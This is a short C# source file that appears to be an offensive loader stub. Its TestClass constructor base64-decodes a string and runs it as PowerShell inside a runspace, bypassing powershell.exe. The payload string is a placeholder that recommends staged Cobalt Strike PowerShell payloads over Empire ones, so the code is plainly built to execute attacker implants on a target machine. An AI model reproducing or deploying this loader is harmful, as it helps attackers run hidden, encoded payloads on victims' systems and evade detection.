using System;
using System.Net;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Management.Automation.Runspaces;
using System.Management.Automation;
using System.Collections.ObjectModel;
using System.Text;

public class TestClass
{

    public TestClass()
    {
        Ex(CSFullyStaged);
    }
    public bool Ex(string cmd)
    {
        string stuff = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
        //string stuff = cmd;

        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();
        pipeline.Commands.AddScript(stuff);
        pipeline.Invoke();
        return true;

    }

    string CSFullyStaged = "Fully staged, base64 encoded, powershell payload here. Cobaltrike ps1 files work best. Empire? not so much.";
}
